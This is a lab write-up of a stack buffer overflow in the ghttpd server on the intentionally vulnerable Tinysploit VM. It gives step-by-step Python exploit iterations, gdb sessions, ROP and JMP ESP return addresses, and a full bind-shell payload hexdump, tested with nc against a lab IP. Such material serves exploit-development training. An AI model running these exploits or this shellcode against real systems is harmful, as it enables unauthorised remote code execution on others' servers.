# Tinysploit

The Tinysploit virtual machine is a headless linux server running a vulnerable HTTP service. It can be downloaded from [here](https://blog.exploitlab.net/2014/07/tinysploit-warm-up-exercise-on-exploit.html).

### Setting up the workflow

When I develop an exploit I find it useful to keep copies of each iteration as I go. I always start with a skeleton that includes a main `exploit.py` file which retrieves the appropriate payload for a given iteration. The individual iterations of the exploit are kept inside a subfolder called iterations.

This is the `exploit.py` file which uses some python magic to generate the payload by running the appropriate `execute` function. It then writes the payload to stdout.
```python
#!/usr/bin/python
# exploit.py

from importlib import import_module

import argparse
import sys

def main(iteration, args):
	module = import_module('iterations.iteration{}'.format(iteration))	
	ex = getattr(module, 'execute')
	payload = ex(args) if args else ex()
	if payload:
		sys.stdout.write(payload)

if __name__ == '__main__':
	parser = argparse.ArgumentParser()
	parser.add_argument('iteration', type=int, help='the iteration of the exploit')
	parser.add_argument('--args', type=str, default='', help='iteration arguments')
	args = parser.parse_args()
	main(args.iteration, args.args)
```

For the first iteration, since the target speaks HTTP, let's try to get a response from the server.
```python
# iteration1.py

def execute():
    payload = "GET /"
    payload += "A"
    payload += " HTTP/1.1\n\n"

    return payload
```

To make things easier, I set up an alias that will deliver the payload to the server. Then I run the `exploit.py` file with an argument of 1 so it generates the payload defined in `iteration1.py`

```sh
alias pwn=nc 192.168.184.130 80 < exploit
./exploit.py 1 > exploit; pwn
```

We get a 200 response from the server. This means that we are formatting the request correctly.
```
HTTP/1.1 200 OK
Server: Can You Hack Me?
Content-Length: 261
Content-Type: text/html

<!doctype html public "-//w3c//dtd html 4.0 transitional//en">
<html>
<head>
<link rel="stylesheet" type="text/css" href="styles.css">
<title>404</title>
</head>
<body>
<h1>HTTP 404 - Page not found</h1>
<h2>Nothing to see here, move along</h2>
</body>
</html>
```

### Fuzzing the server

Now, let's see if we can cause a server crash by changing the payload.

`iteration2.py` takes an extra argument that modifies how many As we send in the GET request. 

```python
# iteration2.py

def execute(n):
    payload = "GET /"
    payload += "A" * int(n) 
    payload += " HTTP/1.1\n\n"

    return payload
```

When we run the exploit with a payload containing 100 As, the server returns the same response as before, but when we run it with 200, there is no response at all from the server.

```sh
$ ./exploit.py 2 --args 200 > exploit; pwn
$ 
```

How can we verify that it crashed? On the Tinysploit VM, we can attach `gdb` to the process by getting the PID.


```sh
# netstat -nap
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      709/ghttpd
```
```
# gdb -pid 709
(gdb) continue
Continuing.
[New process 854]
```

If we run the exploit again, we get the following on the server:
```
Program received signal SIGSEGV, Segmentation fault.
[Switching to process 854]
0x41414141 in ?? ()
```

The server definitely crashed. The best part is that we also have control over EIP. The instruction pointer tried to execute instruction at address 0x41414141 or ASCII 'AAAA'. This means we can control execution based on our input!

### Finding the EIP offset

We will find the offset by using a pattern string. I simply used the ascii uppercase character set with 4 bytes per letter. i.e. AAAABBBBCCCCDDDDEEEE...ZZZZ

```python
# iteration3.py

import string

pattern = "".join([c * 4 for c in string.ascii_uppercase])
padding = "A" * 100

def execute():
    payload = "GET /"
    payload += padding
    payload += pattern  
    payload += " HTTP/1.1\n\n"

    return payload
```

If we run iteration 3 against the server, we get the following:

```
Program received signal SIGSEGV, Segmentation fault.
[Switching to process 880]
0x55545454 in ?? ()
```

EIP contains the value 0x55545454 or 'TTTU' in ASCII.
```python
>>> chr(0x54)
'T'
```
We can find our offset by searching our pattern for the occurence of this string.
```python
>>> import string
>>> pattern = "".join([c * 4 for c in string.ascii_uppercase])
>>> pattern.find("TTTU")
77
```

Now we know that after 177 bytes (100 padding + 77 offset) we will overwrite EIP with our next 4 bytes.
We can confirm this with iteration 4.
```python
# iteration4.py

eip_offset = 177
padding = eip_offset * "A"
eip = "BBBB"

def execute():
    payload = "GET /"
    payload += padding
    payload += eip  
    payload += " HTTP/1.1\n\n"

    return payload
```

```
Program received signal SIGSEGV, Segmentation fault.
[Switching to process 880]
0x42424242 in ?? ()
```
EIP contains ASCII value 'BBBB' which is what we expected.

### Taking control of execution

It's probably possible to use a JMP ESP instruction and put the payload after EIP, but I wanted to try doing it another way.

There's a pretty good chance that there is a pointer to our input stored on the stack somewhere. If we can find it, we can send shellcode in our GET request and point EIP to the start of our input to run arbitrary code.

We want to look at the stack before the program crashes. We can do this by stepping through instructions until the program crashes.

First, before sending the payload, we use the following command instead of `continue`
```
(gdb) nexti 10
```

After sending the payload, we can hold ENTER to step through 10 instructions at a time until it crashes.
```
. . .
0x0804ad2e in ?? ()
(gdb)
0x0804ad94 in ?? ()
(gdb)
0x0804ade1 in ?? ()
(gdb)
0x0804ae31 in ?? ()
(gdb)

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb)
```

The last instruction before the crash is what we want. We need to put a breakpoint before the function epilogue.
Examining the instructions at that address yields the following information:

```
(gdb) x/24i 0x0804ae31

   0x804ae31:   mov    DWORD PTR [esp],eax
   0x804ae34:   call   0x8048c94 <sprintf@plt>
   0x804ae39:   mov    edx,0x804b4b2
   0x804ae3e:   lea    eax,[ebp-0x2a3]
   0x804ae44:   mov    DWORD PTR [esp+0x4],edx
   0x804ae48:   mov    DWORD PTR [esp],eax
   0x804ae4b:   call   0x8048e64 <fopen@plt>
   0x804ae50:   mov    DWORD PTR [ebp-0x10],eax
   0x804ae53:   cmp    DWORD PTR [ebp-0x10],0x0
   0x804ae57:   je     0x804ae7b
   0x804ae59:   lea    eax,[ebp-0x1a4]
   0x804ae5f:   mov    edx,DWORD PTR [ebp-0x10]
   0x804ae62:   mov    DWORD PTR [esp+0x4],edx
   0x804ae66:   mov    DWORD PTR [esp],eax
   0x804ae69:   call   0x8048c84 <fputs@plt>
   0x804ae6e:   mov    eax,DWORD PTR [ebp-0x10]
   0x804ae71:   mov    DWORD PTR [esp],eax
   0x804ae74:   call   0x8048e24 <fclose@plt>
   0x804ae79:   jmp    0x804ae7c
   0x804ae7b:   nop
   0x804ae7c:   leave  
   0x804ae7d:   ret    
   0x804ae7e:   nop
   0x804ae7f:   nop
```

Near the bottom we can see the leave instruction. Let's put a breakpoint there and crash the server again.

```
(gdb) break * 0x804ae7c
Breakpoint 1 at 0x804ae7c
(gdb) continue
Continuing.

[New Process 921]
[Switching to Process 921]

Breakpoint 1, 0x804ae7c in ?? ()
```

If we examine the registers, we can get the values for ESP and EBP Which define our stack frame. The value after EBP is our return address which gets executed by EIP after the function returns.

```
(gdb) info registers 
esp            0xbfffb6d0       0xbfffb6d0
ebp            0xbfffba28       0xbfffba28
```

```
(gdb) x/8xw $ebp  
0xbfffba28:     0x41414141      0x42424242      0x08040022      0xb7ec46a0
0xbfffba38:     0xbfffbb90      0x00000000      0x00000000      0x00000010
```

We can see our injected 'BBBB' in the spot that will be popped into eip, but what is that 0xbfffbb90 address? That is a stack address. If we examine it, we see that it points to our input of 'A's.
```
(gdb) x/20xw 0xbfffbb90
0xbfffbb90:     0x4141412f      0x41414141      0x41414141      0x41414141
0xbfffbba0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbfffbbb0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbfffbbc0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbfffbbd0:     0x41414141      0x41414141      0x41414141      0x41414141
```

### ROP

If we can have that stack address be popped into EIP instead of the value following EBP, then we can change our payload to contain shellcode to execute on the server.

Something we can do is use Return Oriented Programming (ROP) which we can use to manipulate the stack pointer. ROP makes use of chaining 'gadgets' together which are small pieces of code that end with a return instruction. Once we have ESP where we want it, the next `ret` will pop the value of ESP into EIP and continue execution at that address.

What we need is a `pop pop ret` instruction. This will pop the next two addresses off of the stack and then return. The registers those values pop into do not matter, but popping twice will advance ESP so it holds our stack address. After the `ret` instruction, EIP will contain our stack address that is pointing to the start of our 'A's in our input.

We can probably find a `pop pop ret` instruction in the `.text` portion of the binary. We can get that address by looking at the memory mappings:
```
(gdb) info proc map
process 921
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x804c000     0x4000        0x0 /opt/ghttpd/ghttpd
```

We will dump a bunch of instructions to the log so we can parse them more easily:

```
(gdb) set logging on
(gdb) x/2000i 0x8048000
(gdb) quit
```

If we use grep, we can find matches for `ret` and print out the two instructions that come before.
```sh
# grep -B 2 ret gdb.txt 
   0x8048a30:   add    BYTE PTR [eax],al
   0x8048a32:   add    BYTE PTR [eax],al
   0x8048a34:   lock iret 
--
   0x8048c71:   pop    ebx
   0x8048c72:   leave  
   0x8048c73:   ret    
--
   0x8049102:   pop    ebx
   0x8049103:   pop    ebp
   0x8049104:   ret    
```

There is a `pop pop ret` instruction we can use at address 0x8049102!

Let's try making some dummy shellcode. We will use 0xCC instructions which will cause a SIGTRAP.
We will also replace EIP with the address for the `pop pop ret` instruction we found.


```python
# iteration5.py

import struct

pop_pop_ret = 0x8049102

eip_offset = 177
eip = struct.pack("I", pop_pop_ret)

shellcode = "\x90" * 64 + "\xCC" * 64

def execute():
    payload = "GET /"
    payload += shellcode

    padding = (eip_offset - len(shellcode)) * "A"
    payload += padding
    
    payload += eip
    payload += " HTTP/1.1\n\n"

    return payload
```

If we send this payload to the server, we get a SIGTRAP. This means that our shellcode is working correctly!

```
(gdb) continue
Continuing.
[New process 969]

Program received signal SIGTRAP, Trace/breakpoint trap.
[Switching to process 969]
0xbfffbbd2 in ?? ()
```

### TCP Bind Shell

The last thing we need to do is replace the dummy shellcode with actual shellcode.

We can see that the server is running on an x86 linux system.
```sh
# uname -a
Linux tinysploit 3.8.10-tinycore #3810 SMP Tue Apr 30 15:45:26 UTC 2013 i686 GNU/Linux
```

So, we will generate shellcode that targets this system. I use my helper library to accomplish this.

```python
# iteration6.py

import struct

from exploitdev.util import nops
from exploitdev.shellcode import generate

pop_pop_ret = 0x8049102

eip_offset = 177
eip = struct.pack("I", pop_pop_ret)

shellcode = generate("bind", "x86_linux", 4444)

def execute():
    prefix = "GET /"
    suffix = " HTTP/1.1\n\n"

    payload = nops(64)
    payload += shellcode.opcodes

    padding = (eip_offset - len(payload)) * "A"
    payload += padding
    
    payload += eip

    return prefix + payload + suffix
```

Just to make sure there are no characters in our payload that cause problems, we will break one more time before the function returns and check the stack to ensure our payload was fully copied.

```
Breakpoint 1, 0x804ae7c in ?? ()

(gdb) x/40xw 0xbfffbb90
0xbfffbb90:     0x9090902f      0x90909090      0x90909090      0x90909090
0xbfffbba0:     0x90909090      0x90909090      0x90909090      0x90909090
0xbfffbbb0:     0x90909090      0x90909090      0x90909090      0x90909090
0xbfffbbc0:     0x90909090      0x90909090      0x90909090      0x90909090
0xbfffbbd0:     0x53db3190      0x026a5343      0x9958666a      0x80cde189
0xbfffbbe0:     0x66524396      0x665c1168      0x6ae18953      0x51505866
0xbfffbbf0:     0xcde18956      0xd166b080      0x5280cde3      0x89435652
0xbfffbc00:     0xcd66b0e1      0x026a9380      0xcd3fb059      0xf9794980
0xbfffbc10:     0x68520bb0      0x68732f2f      0x69622f68      0x52e3896e
0xbfffbc20:     0xcde18953      0x41414180      0x41414141      0x41414141
```
We can see the payload on the stack and it is fully contiguous. This means there are no bad characters to fix. Lucky us.

If we continue at this point, the program does not crash. It just seems to hang. Let's quit the debugging session and check for our port.
```
(gdb) continue
Continuing.
[New process 1110]
^C
Program received signal SIGINT, Interrupt.
[Switching to process 1110]
0xbfffbc05 in ?? ()
(gdb) quit
A debugging session is active.

        Inferior 2 [process 1110] will be detached.

Quit anyway? (y or n) y
Detaching from program: /opt/ghttpd/ghttpd, process 1110
```
```sh
# netstat -nap | grep 4444
tcp        0      0 0.0.0.0:4444            0.0.0.0:*               LISTEN      1110/ghttpd
```
The port is open! We should be able to get our shell now by connecting to the server on that port.
```sh
$ nc 192.168.184.130 4444
whoami
nobody
```

Success!

### Payload Hexdump:

```
Length: 197 bytes
47 45 54 20  2f 90 90 90  90 90 90 90  90 90 90 90   GET /...........
90 90 90 90  90 90 90 90  90 90 90 90  90 90 90 90   ................
90 90 90 90  90 90 90 90  90 90 90 90  90 90 90 90   ................
90 90 90 90  90 90 90 90  90 90 90 90  90 90 90 90   ................
90 90 90 90  90 31 db 53  43 53 6a 02  6a 66 58 99   .....1.SCSj.jfX.
89 e1 cd 80  96 43 52 66  68 11 5d 66  53 89 e1 6a   .....CRfh.]fS..j
66 58 50 51  56 89 e1 cd  80 b0 66 d1  e3 cd 80 52   fXPQV.....f....R
52 56 43 89  e1 b0 66 cd  80 93 6a 02  59 b0 3f cd   RVC...f...j.Y.?.
80 49 79 f9  b0 0b 52 68  2f 2f 73 68  68 2f 62 69   .Iy...Rh//shh/bi
6e 89 e3 52  53 89 e1 cd  80 41 41 41  41 41 41 41   n..RS....AAAAAAA
41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41   AAAAAAAAAAAAAAAA
41 41 41 41  41 41 02 91  04 08 20 48  54 54 50 2f   AAAAAA.... HTTP/
31 2e 31 0a  0a                                      1.1..
```


### JMP ESP

For completeness, here is the variation using JMP ESP.

We find an address in libc for JMP ESP (0xFFE4)
```
(gdb) info proc map                                                                                                                                                                                                 
process 715
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
         . . .
        0xb7ec5000 0xb7fdc000   0x117000        0x0 /lib/libc-2.17.so
(gdb) find /b 0xb7ec5000, 0xb7fdc000, 0xff, 0xe4
0xb7ec7a51
0xb7fb7223
. . .
24 patterns found.
```

There are 24 possibilities, but let's just use the first one.

```python
# iteration7.py
# JMP ESP variation

import struct

from exploitdev.util import nops
from exploitdev.shellcode import generate

jmp_esp = 0xb7ec7a51

eip_offset = 177
eip = struct.pack("I", jmp_esp)

shellcode = generate("bind", "x86_linux", 4444)

def execute():
    prefix = "GET /"
    suffix = " HTTP/1.1\n\n"

    padding = eip_offset * "A"
    
    payload = padding
    payload += eip
    payload += nops(32)
    payload += shellcode.opcodes
    payload += nops(16)
    
    return prefix + payload + suffix
```

And the shell works just as before.
```
$ ./exploit.py 7 > exploit; pwn &
INFO:root:Payload type: bind
INFO:root:Platform: x86_linux
INFO:root:Generating bind shellcode for x86_linux target.
[1] 2386
$ nc 192.168.184.130 4444
whoami
nobody
```
